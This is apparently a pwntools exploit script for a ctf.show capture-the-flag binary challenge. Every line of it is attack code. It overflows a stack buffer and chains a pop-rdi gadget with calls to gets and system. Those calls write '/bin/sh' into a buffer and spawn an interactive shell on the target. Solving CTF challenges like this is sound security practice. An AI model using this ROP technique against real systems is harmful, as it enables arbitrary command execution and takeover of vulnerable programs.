from pwn import *
from kk import *
context.log_level = 'debug'
context(arch = 'amd64',os = 'linux',log_level = 'debug')

#p = remote('pwn.challenge.ctf.show', 28244)
p = process('./pwn')
elf = ELF('./pwn')

system_addr = elf.plt['system']
gets_addr = elf.plt['gets']
pop_rdi_addr = 0x4007f3
buf2 = 0x602080

GDB(p)
p.recvline(b'get system parameter!')
payload = b'a'*(0xA+8) + p64(pop_rdi_addr) + p64(buf2) + p64(gets_addr) + p64(pop_rdi_addr) + p64(buf2) + p64(system_addr)
p.sendline(payload)
p.sendline(b'/bin/sh\x00')

p.interactive()
